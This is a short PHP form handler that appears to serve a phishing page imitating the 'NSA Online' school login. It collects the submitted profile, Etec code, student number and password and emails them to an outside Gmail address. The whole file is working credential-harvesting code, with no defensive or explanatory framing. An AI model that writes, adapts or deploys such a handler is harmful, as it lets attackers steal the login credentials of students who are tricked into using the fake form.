<?php
$to = "reservac31@gmail.com"; // <-- Substitua pelo seu e-mail real
$subject = "Dados do Formulário - NSA Online";

$perfil = $_POST['perfil'];
$codetec = $_POST['codetec'];
$rm = $_POST['rm'];
$senha = $_POST['senha'];

$message = "Entrar como: $perfil\n";
$message .= "Cod. Etec: $codetec\n";
$message .= "RM: $rm\n";
$message .= "Senha: $senha\n";

$headers = "From: nsaonline@seudominio.com";

if (mail($to, $subject, $message, $headers)) {
    echo "Dados enviados com sucesso!";
} else {
    echo "Erro ao enviar os dados.";
}
?>
